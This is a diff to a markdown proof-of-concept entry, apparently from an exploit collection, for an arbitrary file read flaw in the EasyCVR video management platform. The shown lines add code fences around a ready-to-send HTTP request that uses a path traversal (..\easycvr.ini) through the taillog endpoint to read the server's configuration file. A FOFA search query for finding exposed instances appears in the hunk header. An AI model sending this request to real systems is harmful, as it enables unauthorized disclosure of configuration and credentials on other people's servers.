@@ -79,6 +79,7 @@ FOFA：title="EasyCVR"
 
 POC/EXP：
 
+```http
 GET /taillog/oxsecl/..\easycvr.ini HTTP/1.1
 Host: 127.0.0.1
 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/101.0.4951.54 Safari/537.36
@@ -86,6 +87,8 @@ Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/w
 Accept-Encoding: gzip, deflate
 Accept-Language: zh-CN,zh;q=0.9
 Connection: close
+```
+
 
 ![image-20241209142220321](./.resource/EasyCVR-视频管理平台taillog任意文件读取漏洞/media/image-20241209142220321.png)
 
